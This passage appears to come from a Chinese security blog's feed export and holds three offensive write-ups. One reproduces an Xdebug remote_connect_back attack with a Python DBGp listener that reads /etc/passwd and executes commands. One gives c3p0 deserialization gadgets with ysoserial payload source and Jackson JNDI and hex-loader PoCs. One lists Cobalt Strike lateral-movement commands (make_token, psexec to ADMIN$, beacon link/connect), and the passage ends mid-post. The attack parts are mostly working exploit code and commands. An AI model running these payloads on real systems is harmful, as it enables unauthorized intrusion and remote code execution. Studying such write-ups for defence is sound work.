class="attr">idekey</span>=<span class="string">&quot;phpstorm&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">engine</span> <span class="attr">version</span>=<span class="string">&quot;2.5.5&quot;</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Xdebug]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">engine</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Derick Rethans]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[http://xdebug.org]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">copyright</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">copyright</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要注意的在调试过程中有输出，并不会立即出现在网页上，待全部调试结束后才会输出到网页中，调试的之前你需要确保你已经配置好了xdebug扩展(php.ini)。</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>攻击思路来自<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface">初心を忘れず</a></p>
<p>这里将文中提到的姿势进行复现,偷一波脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">ip_port = (<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind(ip_port)</span><br><span class="line">sk.listen(<span class="number">10</span>)</span><br><span class="line">conn, addr = sk.accept()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(client_data)</span><br><span class="line">    data = raw_input(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读文件</span></span><br><span class="line">    conn.sendall(<span class="string">&#x27;source -i 1 -f %s\x00&#x27;</span> % data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#执行命令</span></span><br><span class="line">    <span class="comment">#conn.sendall(&#x27;eval -i 1 -- %s\x00&#x27; % data.encode(&#x27;base64&#x27;))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#执行命令2</span></span><br><span class="line">    <span class="comment">#conn.sendall(&#x27;property_set -n $a -i 1 -c 1 -- %s\x00&#x27; % data.encode(&#x27;base64&#x27;))</span></span><br></pre></td></tr></table></figure>
<p>触发漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.169.88/test1.php?XDEBUG_SESSION_START=phpstorm&#x27;</span> -H <span class="string">&quot;X-Forwarded-For: 192.168.169.36&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="source">source</h3>
<p>file:///etc/passwd<br>
<img src="2.png" alt=""></p>
<h3 id="eval">eval</h3>
<p>system(“id”);<br>
<img src="3.png" alt=""></p>
<h3 id="property-set">property_set</h3>
<p>system(“id”);<br>
<img src="6.png" alt=""></p>
<p>退出后可以看到<br>
<img src="7.png" alt=""></p>
<p>尝试写shell失败（test是777），忽然想到可以base64。<br>
<img src="8.png" alt=""></p>
<h2 id="最后">最后</h2>
<p>利用条件是要xdebug.remote_connect_back开启</p>
<p>在文档是这样描述的：<br>
xdebug.remote_connect_back<br>
类型: boolean, 默认值: 0, 始于 Xdebug &gt; 2.1</p>
<p>如果设置生效， xdebug.remote_host 设置会忽略而Xdebug会尝试给制造HTTP请求的客户端进行连接。它会检查$_SERVER[‘REMOTE_ADDR’] 变量并找出使用的IP地址。请记住它没有有效的过滤，任何人都能启动调试会话连接到服务器，即使他们的地址并不匹配 xdebug.remote_host.</p>
<h2 id="参考">参考</h2>
<p><a href="https://my.oschina.net/atanl/blog/371424?fromerr=FV9ksMPu">Xdebug工作原理</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>c3p0的三个gadget</title>
    <url>/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/</url>
    <content><![CDATA[<!-- 除了常见的http base之外，在某些情况下c3p0可以使用jndi和hex序列化字节加载器来进行rce。 -->
<!-- more -->
<p>c3p0有三种方式getshell</p>
<ul>
<li>http base</li>
<li>jndi</li>
<li>hex序列化字节加载器</li>
</ul>
<p>http base适用于原生反序列化，后面两种适用于其他解组类型的反序列化。具体来讲，jndi适用于jdk8u191以下支持reference情况，hex序列化字节加载器适用于不出网但是目标依赖有gadget链的情况。</p>
<h2 id="http-base">http base</h2>
<p>c3p0 payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * com.sun.jndi.rmi.registry.RegistryContext-&gt;lookup</span></span><br><span class="line"><span class="comment"> * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized-&gt;getObject</span></span><br><span class="line"><span class="comment"> * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase-&gt;readObject</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Arguments:</span></span><br><span class="line"><span class="comment"> * - base_url:classname</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Yields:</span></span><br><span class="line"><span class="comment"> * - Instantiation of remotely loaded class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( harness=<span class="string">&quot;ysoserial.test.payloads.RemoteClassLoadingTest&quot;</span> )</span><br><span class="line"><span class="meta">@Dependencies( &#123; &quot;com.mchange:c3p0:0.9.5.2&quot; ,&quot;com.mchange:mchange-commons-java:0.2.11&quot;&#125; )</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PoolBackedDataSource</span> <span class="variable">b</span> <span class="operator">=</span> Reflections.createWithoutConstructor(PoolBackedDataSource.class);</span><br><span class="line">        Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">&quot;connectionPoolDataSource&quot;</span>).set(b, <span class="keyword">new</span> <span class="title class_">PoolSource</span>(className, url));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">PoolSource</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String className;</span><br><span class="line">        <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">PoolSource</span> <span class="params">( String className, String url )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.className = className;</span><br><span class="line">            <span class="built_in">this</span>.url = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;exploit&quot;</span>, <span class="built_in">this</span>.className, <span class="built_in">this</span>.url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException &#123;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span> <span class="params">( <span class="type">int</span> seconds )</span> <span class="keyword">throws</span> SQLException &#123;&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.run(C3P0.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>connectionPoolDataSource是PoolSource，但是PoolSource没有实现序列化接口，所以会在PoolBackedDataSource时进入到catch块中。<br>
<img src="1586157998304-98f88cb3-35d4-4b17-b735-a381447d3604.png#align=left&amp;display=inline&amp;height=298&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=596&amp;originWidth=2822&amp;size=175522&amp;status=done&amp;style=none&amp;width=1411" alt="image.png"></p>
<p><img src="1586157880994-1fe1db61-f3a5-45a3-a591-4af5ef5cee26.png#align=left&amp;display=inline&amp;height=628&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1256&amp;originWidth=1514&amp;size=146157&amp;status=done&amp;style=none&amp;width=757" alt="image.png"></p>
<p><img src="1586157739966-f17e2977-5809-47de-ae93-56a634a2ae63.png#align=left&amp;display=inline&amp;height=390&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=780&amp;originWidth=2348&amp;size=199375&amp;status=done&amp;style=none&amp;width=1174" alt="image.png"></p>
<p>catch块中调用indirector.indirectForm(this.connectionPoolDataSource)会把Referenceable类型放到ReferenceSerialized中并进行序列化。<br>
<img src="1586158218862-65b4fe36-0548-40a6-9243-67d6716739ed.png#align=left&amp;display=inline&amp;height=350&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=700&amp;originWidth=2474&amp;size=144888&amp;status=done&amp;style=none&amp;width=1237" alt="image.png"></p>
<p>在反序列化时，会调用ReferenceSerialized的getObject方法，向http base请求类<br>
<img src="1586158470733-c79c8427-b1d3-482d-8082-c8b9c4e4b3b1.png#align=left&amp;display=inline&amp;height=194&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=388&amp;originWidth=2014&amp;size=79716&amp;status=done&amp;style=none&amp;width=1007" alt="image.png"></p>
<p><img src="1586158529333-efc7783e-8941-45de-9242-b6b5043e49a9.png#align=left&amp;display=inline&amp;height=485&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=970&amp;originWidth=2208&amp;size=195296&amp;status=done&amp;style=none&amp;width=1104" alt="image.png"></p>
<p><img src="1586158599877-ad23b7dc-9541-416e-8563-ea92e0a0f47c.png#align=left&amp;display=inline&amp;height=387&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=774&amp;originWidth=2164&amp;size=167546&amp;status=done&amp;style=none&amp;width=1082" alt="image.png"></p>
<h2 id="jndi-注入">jndi 注入</h2>
<p>PoolBackedDataSourceBase<br>
<img src="1586157023673-1ba52779-d0e1-4e31-a9e3-a92873f39dfe.png#align=left&amp;display=inline&amp;height=470&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=940&amp;originWidth=2002&amp;size=188137&amp;status=done&amp;style=none&amp;width=1001" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatePoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&#123;\&quot;jndiName\&quot;:\&quot;rmi://localhost:8088/Exploit\&quot;, \&quot;loginTimeout\&quot;:0&#125;]&#125;&quot;</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(poc, Person.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArray, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sTemp</span> <span class="operator">=</span> Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="1586746951558-7748fb17-b819-4eaa-9aa9-edff94e8bd90.png#align=left&amp;display=inline&amp;height=243&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=486&amp;originWidth=1944&amp;size=127935&amp;status=done&amp;style=none&amp;width=972" alt="image.png"></p>
<p><img src="1586747039311-88d990d3-4b87-4570-b33b-b32b0e9bbcd5.png#align=left&amp;display=inline&amp;height=256&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=512&amp;originWidth=2204&amp;size=101206&amp;status=done&amp;style=none&amp;width=1102" alt="image.png"></p>
<p><img src="1586747042329-d08d3f11-8212-4e27-b5db-692d2fd316af.png#align=left&amp;display=inline&amp;height=276&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=488&amp;originWidth=1320&amp;size=68944&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p><img src="1586747066747-72ba5789-3d66-407b-a184-8b672916fe76.png#align=left&amp;display=inline&amp;height=280&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=560&amp;originWidth=2200&amp;size=145105&amp;status=done&amp;style=none&amp;width=1100" alt="image.png"></p>
<h2 id="hex序列化字节加载器">hex序列化字节加载器</h2>
<p><img src="1586157043057-ea21e78c-b10c-4f83-9dd5-198c1a5b6ae1.png#align=left&amp;display=inline&amp;height=451&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=902&amp;originWidth=2004&amp;size=179448&amp;status=done&amp;style=none&amp;width=1002" alt="image.png"><br>
<img src="1586157060893-23a3eaed-43e6-43b6-89b5-21803abfe30f.png#align=left&amp;display=inline&amp;height=335&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=670&amp;originWidth=1976&amp;size=153585&amp;status=done&amp;style=none&amp;width=988" alt="image.png"></p>
<p>在一些非原生的反序列化（如jackson）的情况下，c3p0可以做到不出网利用。其原理是利用jackson的反序列化时调用userOverridesAsString的setter，在setter中运行过程中会把传入的以HexAsciiSerializedMap开头的字符串进行解码并触发原生反序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatePoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/cengsiqi/Desktop/test.ser&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] data = toByteArray(in);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">HexString</span> <span class="operator">=</span> bytesToHexString(data, data.length);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;object\&quot;:[\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&#123;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ HexString + <span class="string">&quot;;\&quot;&#125;]&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(poc, Person.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArray, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sTemp</span> <span class="operator">=</span> Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>简单跟踪一下，进入setter方法。<br>
<img src="1586744313296-ca6b14b1-4297-4f09-a344-563ba85cf168.png#align=left&amp;display=inline&amp;height=363&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=726&amp;originWidth=2460&amp;size=210573&amp;status=done&amp;style=none&amp;width=1230" alt="image.png"></p>
<p>由parseUserOverridesAsString对字符串进行处理<br>
<img src="1586744361091-dae2b1e6-349a-4863-8c80-bcd9fe960f07.png#align=left&amp;display=inline&amp;height=1332&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=1332&amp;originWidth=2568&amp;size=442605&amp;status=done&amp;style=none&amp;width=2568" alt="image.png"></p>
<p>提取HexAsciiSerializedMap之后的东西<br>
<img src="1586744421955-161d66ba-096b-4df9-97a4-9bb506f94f07.png#align=left&amp;display=inline&amp;height=185&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=370&amp;originWidth=2528&amp;size=123596&amp;status=done&amp;style=none&amp;width=1264" alt="image.png"></p>
<p>最后由fromByteArray中的deserializeFromByteArray进行反序列化<br>
<img src="1586744477494-4055d369-1a34-49f3-9836-091d4471928c.png#align=left&amp;display=inline&amp;height=100&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=200&amp;originWidth=2244&amp;size=67588&amp;status=done&amp;style=none&amp;width=1122" alt="image.png"></p>
<p><img src="1586744495756-bf0a1af2-742b-49ad-90e5-e926633529be.png#align=left&amp;display=inline&amp;height=124&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=248&amp;originWidth=2250&amp;size=65436&amp;status=done&amp;style=none&amp;width=1125" alt="image.png"></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>cobaltstrike在横向移动中的上线技巧</title>
    <url>/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<!-- cobaltstrike在横向移动中的上线技巧 -->
<!-- more -->
<h2 id="cobaltstrike-psexec">cobaltstrike psexec</h2>
<p>在进行pexecz之前一般需要用rev2vself回到原来的回话和克隆token</p>
<ul>
<li>rev2self:  Revert to your original access token</li>
<li>make_token:  Clone the current access token and set it up to pass the specified username<br>
and password when you interact with network resources. This command does not<br>
validate the credentials you provide and it has no effect on local actions.</li>
<li>psexec: Spawn a session on a remote host. This command generates an executable, copies it to the target, creates a service to run it, and cleans up after itself. You must specify which share (e.g., ADMIN$ or C$) to copy the file to.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rev2self</span><br><span class="line">make_token administrator aaa123!@#</span><br><span class="line">psexec 192.168.20.30 ADMIN$ smb-bind-pipe</span><br></pre></td></tr></table></figure>
<p>smb-bind-pipe是建立的smb监听器的名字，创建smb监听器的时候会要求输入端口，不知道意义何在，随便填一个就好。</p>
<p>用这种方法上线的权限是系统权限<br>
<img src="./1563712543324.png" alt="Alt text"></p>
<p>ps：后来看cs输出，填的端口号会是命名管道的一部分，这样好处就是可以在一个机器上开多个管道吧<br>
<img src="./1563712694799.png" alt="Alt text"></p>
<h2 id="cobaltstrike-smb-pipe">cobaltstrike smb pipe</h2>
<p>其实上面psexec指定的是smb-bind-pipe listener，那么psexec成功后通信方式就是基于smb。使用smb的好处可以一定程度上规避流量审查。另外一种使用smb办法就是生成windows executes，在目标机器上运行然后link，这种方法拿到的就是，运行这个exe用户的权限而不是system权限。</p>
<p>Use: link [ip address]<br>
Link to the Beacon at the specified IP address.</p>
<p><img src="./1563713352498.png" alt="Alt text"></p>
<p>ps:<strong>在使用unlink的时候smb pipe都会断掉，但是smb pipe的进程并不会退出，link两次后通过psexec和运行exe的shell都会恢复</strong></p>
<h2 id="cobaltstrike-bind-tcp">cobaltstrike bind tcp</h2>
<p>建立listener后和smb一样，可以用psexec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rev2self</span><br><span class="line">make_token administrator aaa123!@#</span><br><span class="line">psexec 192.168.20.30 ADMIN$ bind-tcp</span><br></pre></td></tr></table></figure>
<p>也可以生成exe，然后使用connect连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect 192.168.20.30</span><br></pre></td></tr></table></figure>
<p>需要说明的是创建监听器的时候填写的端口并没有什么用<br>
<img src="./1563764126695.png" alt="Alt text"><br>
实际监听的时候还是监听的4444端口<br>
<img src="./1563765538981.png" alt="Alt text"></p>
<p>加上smb，和tcp，拓扑图如下，蓝色是tcp，黄色是smb<br>
<img src="./1563765344629.png" alt="Alt text"></p>
<p>ps：<strong>smb和tcp的相同点在于，unlink会同时断掉tcp和smb会话，不同点在于smb可以通过link连接回来，但是connect无法连接回来tcp，原因在于unlink后smb类型进程还是存在，但是tcp的unlink后进程会退出。</strong></p>
<h2 id="cobaltstrike-reverse-tcp">cobaltstrike reverse tcp</h2>
<p>cs3.13之后新更新的一个listener，相当nice的一点是Linux跳板机上也支持这种操作，不过在创建listener的时候并不会出现。<br>
<img src="./1563766274358.png" alt="Alt text"></p>
<p>找到它需要在<br>
<img src="./1563766369946.png" alt="Alt text"></p>
<p><img src="./1563766738365.png" alt="Alt text"></p>
<p>命令行如下</p>
